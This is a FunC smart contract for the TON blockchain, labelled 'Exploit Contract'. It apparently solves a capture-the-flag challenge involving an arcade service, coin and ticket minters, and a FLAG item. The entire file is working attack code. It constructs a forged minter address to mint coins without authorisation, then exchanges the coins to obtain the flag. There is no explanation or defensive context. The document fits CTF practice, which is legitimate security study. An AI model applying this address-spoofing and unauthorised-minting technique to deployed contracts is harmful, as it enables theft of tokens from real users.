#include "imports/stdlib.fc";
#include "common/utils.fc";
#include "common/opcode.fc";
#include "common/errors.fc";
#include "common/constants.fc";
#include "bytecode/base_contract_code.fc";

;;;;;;;;;; Exploit Storage ;;;;;;;;;;

global slice exploit::my_account;

() exploit::load_data() impure inline_ref {
    slice ds = get_data().begin_parse();
    exploit::my_account = ds~load_msg_addr();
    ds.end_parse();
}

() exploit::save_data() impure inline_ref {
    begin_cell()
        .store_slice(exploit::my_account)
    .end_cell()
    .set_data();
}

;;;;;;;;;; Exploit Contract ;;;;;;;;;;

const int exploit::op::run = "run"c; ;; 5076a4c0

() recv_internal(int my_balance, int ctx::value, cell in_msg_full, slice ctx::body) impure {
    slice s = in_msg_full.begin_parse();
    int flags = s~load_msg_flags();

    if (is_bounced(flags) | ctx::body.slice_empty?()) {
        ;; ignore bounced messages and empty messages
        return ();
    }

    (slice ctx::sender, int ctx::fwd_fee) = s~retrieve_ctx(BASECHAIN);

    (int op, int query_id) = ctx::body~load_op_and_query_id();

    if op == exploit::op::run {
        slice service_counter = ctx::body~load_msg_addr();
        slice coin_minter = ctx::body~load_msg_addr();
        slice ticket_minter = ctx::body~load_msg_addr();

        if query_id == 0 {
            exploit::my_account = get_account_address(service_counter, my_address(), base_contract_code());
            exploit::save_data();
            send_msg(service_counter, 0, begin_cell()
                .store_op(op::register)
                .store_query_id(0)
                .end_cell(), SEND_MODE_CARRY_ALL_REMAINING_MESSAGE_VALUE);
        }
        if query_id == 1 {
            exploit::load_data();
            slice arcade_machine_addr = get_arcade_machine_address(service_counter, 0, 0, base_contract_code());
            (_, int coin_minter_id) = parse_std_addr(coin_minter);
            slice new_coin_minter = begin_cell()
                .store_uint(3, 2)
                .store_uint(0, 1)
                .store_uint(256, 9)
                .store_int(BASECHAIN, 32)
                .store_uint(coin_minter_id, 256)
                .end_cell().begin_parse();
            cell master_msg = begin_cell()
                .store_op(op::internal_transfer)
                .store_query_id(query_id)
                .store_coins(COIN_PRICE / 100) ;; mint 8 coins
                .store_slice(coin_minter)
                .store_address_none()
                .store_coins(0)
                .store_uint(0, 1)
                .end_cell();
            cell msg = begin_cell()
                .store_op(op::external_call)
                .store_query_id(query_id)
                .store_slice(new_coin_minter)
                .store_ref(
                    begin_cell()
                        .store_op(op::mint)
                        .store_query_id(query_id)
                        .store_slice(my_address())
                        .store_coins(ctx::fwd_fee + BUY_COIN_MINT_GAS)
                        .store_ref(master_msg)
                    .end_cell()
                )
                .store_coins(ctx::fwd_fee * 2 + COIN_TOTAL_MINT_GAS)
                .end_cell();
            send_msg(exploit::my_account, ctx::fwd_fee * 2 + COIN_TOTAL_MINT_GAS + 15000000, msg, SEND_MODE_PAY_FEES_SEPARATELY);
        }
        if query_id == 2 {
            exploit::load_data();
            send_msg(exploit::my_account, 0, begin_cell()
                .store_op(op::play)
                .store_query_id(query_id)
                .store_uint(0, ARCADE_MACHINE_GAME_TYPE_SIZE)
                .store_uint(0, ARCADE_MACHINE_ID_SIZE)
                .store_coins(8)
                .end_cell(), SEND_MODE_CARRY_ALL_REMAINING_MESSAGE_VALUE);
        }
        if query_id == 3 {
            exploit::load_data();
            cell master_msg = begin_cell()
                .store_op(op::internal_transfer)
                .store_query_id(query_id)
                .store_coins(FLAG_PRICE)
                .store_slice(exploit::my_account)
                .store_address_none()
                .store_coins(EXCHANGE_NOTIFICATION_GAS + ctx::fwd_fee)
                .store_maybe_ref(
                    begin_cell()
                        .store_op(op::exchange)
                        .store_slice(my_address())
                        .store_uint(FLAG, ITEM_ID_SIZE)
                        .store_uint(0, 1)
                    .end_cell()
                )
                .end_cell();
            cell msg = begin_cell()
                .store_op(op::exchange)
                .store_query_id(query_id)
                .store_coins(COIN_PRICE)
                .store_uint(COIN, ITEM_ID_SIZE)
                .store_maybe_ref(
                    begin_cell()
                        .store_slice(ticket_minter)
                        .store_ref(
                            begin_cell()
                                .store_op(op::mint)
                                .store_query_id(query_id)
                                .store_slice(service_counter)
                                .store_coins(ctx::fwd_fee + EXCHANGE_NOTIFICATION_GAS + TRANSFER_TICKET_GAS)
                                .store_ref(master_msg)
                            .end_cell()
                        )
                    .end_cell()
                )
                .end_cell();
            send_msg(exploit::my_account, 0, msg, SEND_MODE_CARRY_ALL_REMAINING_MESSAGE_VALUE);
        }

        return ();
    }

}